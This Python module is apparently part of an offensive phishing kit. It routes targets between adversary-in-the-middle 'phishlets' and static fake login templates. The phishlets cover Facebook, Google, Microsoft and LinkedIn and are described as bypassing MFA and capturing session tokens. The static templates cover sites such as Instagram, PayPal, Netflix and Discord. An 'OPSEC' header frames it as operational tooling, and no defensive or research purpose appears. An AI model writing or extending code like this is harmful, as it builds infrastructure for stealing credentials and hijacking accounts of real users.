"""
Template Router - Static vs AiTM Routing Logic
Source: plan-review-meta-instruction2.md (C.7 resolution)
OPSEC: Routes requests appropriately between static templates and AiTM proxy
"""

from typing import Optional, Dict
from dataclasses import dataclass
from enum import Enum


class RouteType(Enum):
    """Route type enumeration"""
    EVILPANEL_AITM = "evilpanel_aitm"
    STATIC_TEMPLATE = "static_template"
    BLOCKED = "blocked"


# Phishlets that support AiTM (MFA bypass, session tokens)
SUPPORTED_PHISHLETS = {
    'facebook': {
        'supports_mfa_bypass': True,
        'supports_session_tokens': True,
        'requires_ssl': True,
        'domains': ['facebook.com', 'fb.com', 'm.facebook.com']
    },
    'google': {
        'supports_mfa_bypass': True,
        'supports_session_tokens': True,
        'requires_ssl': True,
        'domains': ['google.com', 'accounts.google.com']
    },
    'microsoft': {
        'supports_mfa_bypass': True,
        'supports_session_tokens': True,
        'requires_ssl': True,
        'domains': ['microsoft.com', 'login.microsoftonline.com']
    },
    'linkedin': {
        'supports_mfa_bypass': True,
        'supports_session_tokens': True,
        'requires_ssl': True,
        'domains': ['linkedin.com', 'www.linkedin.com']
    }
}

# Static templates available in MaxPhisher
STATIC_TEMPLATES = {
    'instagram',
    'twitter',
    'snapchat',
    'tiktok',
    'paypal',
    'netflix',
    'spotify',
    'steam',
    'discord'
}


@dataclass
class RouteDecision:
    """Route decision result"""
    route_type: RouteType
    target: str
    phishlet_name: Optional[str] = None
    template_path: Optional[str] = None
    reason: str = ""


class TemplateRouter:
    """
    Routes requests between Static Templates and AiTM Proxy
    Source: plan-review-meta-instruction2.md
    
    Routing Logic:
    1. If target requires MFA bypass or session tokens → Route to AiTM
    2. If target is in SUPPORTED_PHISHLETS and enabled → Route to AiTM
    3. If target is in STATIC_TEMPLATES → Route to static
    4. Otherwise → Use fallback template or block
    """
    
    def __init__(self):
        self.enabled_phishlets: Dict[str, bool] = {}
        self.template_base_path = "~/.maxsites"
    
    def set_phishlet_enabled(self, name: str, enabled: bool) -> None:
        """Set phishlet enabled state"""
        self.enabled_phishlets[name] = enabled
    
    def route_request(
        self,
        target: str,
        mfa_bypass_required: bool = False,
        session_token_required: bool = False
    ) -> RouteDecision:
        """
        Determine routing for a request
        
        Args:
            target: Target service name (e.g., 'facebook', 'instagram')
            mfa_bypass_required: Whether MFA bypass is required
            session_token_required: Whether session token capture is required
            
        Returns:
            RouteDecision with route type and target info
        """
        target_lower = target.lower()
        
        # Check if MFA bypass or session tokens are required
        if mfa_bypass_required or session_token_required:
            return self._route_to_aitm_if_supported(target_lower)
        
        # Check if target is a supported phishlet
        if target_lower in SUPPORTED_PHISHLETS:
            # Check if phishlet is enabled
            if self.enabled_phishlets.get(target_lower, False):
                return RouteDecision(
                    route_type=RouteType.EVILPANEL_AITM,
                    target=target_lower,
                    phishlet_name=target_lower,
                    reason="Phishlet enabled and supports AiTM"
                )
            else:
                # Phishlet exists but not enabled - use static if available
                if target_lower in STATIC_TEMPLATES:
                    return RouteDecision(
                        route_type=RouteType.STATIC_TEMPLATE,
                        target=target_lower,
                        template_path=self.get_fallback_template(target_lower),
                        reason="Phishlet disabled, using static template"
                    )
        
        # Check if static template exists
        if target_lower in STATIC_TEMPLATES:
            return RouteDecision(
                route_type=RouteType.STATIC_TEMPLATE,
                target=target_lower,
                template_path=self.get_fallback_template(target_lower),
                reason="Using static template"
            )
        
        # No template available - use generic fallback
        return RouteDecision(
            route_type=RouteType.STATIC_TEMPLATE,
            target=target_lower,
            template_path=self.get_fallback_template('generic'),
            reason="No specific template, using generic fallback"
        )
    
    def _route_to_aitm_if_supported(self, target: str) -> RouteDecision:
        """Route to AiTM if supported, otherwise reject"""
        if target in SUPPORTED_PHISHLETS:
            phishlet_info = SUPPORTED_PHISHLETS[target]
            
            if phishlet_info['supports_mfa_bypass']:
                return RouteDecision(
                    route_type=RouteType.EVILPANEL_AITM,
                    target=target,
                    phishlet_name=target,
                    reason="Routed to AiTM for MFA bypass capability"
                )
        
        # Target doesn't support AiTM features
        return RouteDecision(
            route_type=RouteType.BLOCKED,
            target=target,
            reason=f"Target '{target}' does not support required AiTM features"
        )
    
    def get_fallback_template(self, target: str) -> str:
        """
        Get fallback template path for target
        
        Args:
            target: Target service name
            
        Returns:
            Path to template directory
        """
        from os.path import expanduser, join
        
        base_path = expanduser(self.template_base_path)
        
        # Map target to template directory names
        template_map = {
            'facebook': 'facebook',
            'instagram': 'instagram',
            'twitter': 'twitter',
            'google': 'google',
            'microsoft': 'microsoft',
            'linkedin': 'linkedin',
            'snapchat': 'snapchat',
            'tiktok': 'tiktok',
            'paypal': 'paypal',
            'netflix': 'netflix',
            'spotify': 'spotify',
            'steam': 'steam',
            'discord': 'discord',
            'generic': 'default'
        }
        
        template_dir = template_map.get(target, 'default')
        return join(base_path, template_dir)
    
    def is_aitm_capable(self, target: str) -> bool:
        """Check if target supports AiTM"""
        return target.lower() in SUPPORTED_PHISHLETS
    
    def get_supported_phishlets(self) -> Dict[str, dict]:
        """Get all supported AiTM phishlets"""
        return SUPPORTED_PHISHLETS.copy()
    
    def get_static_templates(self) -> set:
        """Get all static templates"""
        return STATIC_TEMPLATES.copy()
    
    def route_by_domain(self, domain: str) -> RouteDecision:
        """
        Route request by domain name
        
        Args:
            domain: Full domain name (e.g., 'www.facebook.com')
            
        Returns:
            RouteDecision for the domain
        """
        domain_lower = domain.lower()
        
        # Check against phishlet domains
        for phishlet_name, phishlet_info in SUPPORTED_PHISHLETS.items():
            for supported_domain in phishlet_info['domains']:
                if domain_lower.endswith(supported_domain):
                    return self.route_request(phishlet_name)
        
        # No matching domain - return generic
        return RouteDecision(
            route_type=RouteType.STATIC_TEMPLATE,
            target='generic',
            template_path=self.get_fallback_template('generic'),
            reason="Domain not recognized, using generic template"
        )
    
    def validate_route(self, decision: RouteDecision) -> bool:
        """
        Validate a routing decision is executable
        
        Args:
            decision: RouteDecision to validate
            
        Returns:
            bool: True if route is valid and can be executed
        """
        from os.path import exists, expanduser
        
        if decision.route_type == RouteType.BLOCKED:
            return False
        
        if decision.route_type == RouteType.EVILPANEL_AITM:
            # Check phishlet is available
            return decision.phishlet_name in SUPPORTED_PHISHLETS
        
        if decision.route_type == RouteType.STATIC_TEMPLATE:
            # Check template path exists
            if decision.template_path:
                return exists(expanduser(decision.template_path))
            return False
        
        return False

